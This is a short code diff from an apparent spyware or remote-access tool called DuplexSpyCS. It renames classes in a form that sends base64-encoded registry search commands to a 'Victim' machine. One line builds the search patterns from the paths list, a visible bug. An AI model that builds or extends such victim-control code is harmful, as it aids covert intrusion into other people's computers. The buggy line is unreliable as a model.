@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmRegFind : Form
     {
-        public Victim v;
+        public clsVictim v;
         public string currentPath;
 
         public frmRegFind()
@@ -74,8 +74,8 @@ namespace DuplexSpyCS
 
             new Thread(() =>
             {
-                string b64Paths = string.Join(",", paths.Select(x => Crypto.b64E2Str(x)).ToArray());
-                string b64Patterns = string.Join(",", paths.Select(x => Crypto.b64E2Str(x)).ToArray());
+                string b64Paths = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());
+                string b64Patterns = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());
 
                 v.SendCommand($"reg|find|{b64Paths}|{b64Patterns}|{method}|{ignoreCase}|{dwItemType}|{keyKind.ToString()}");
             }).Start();
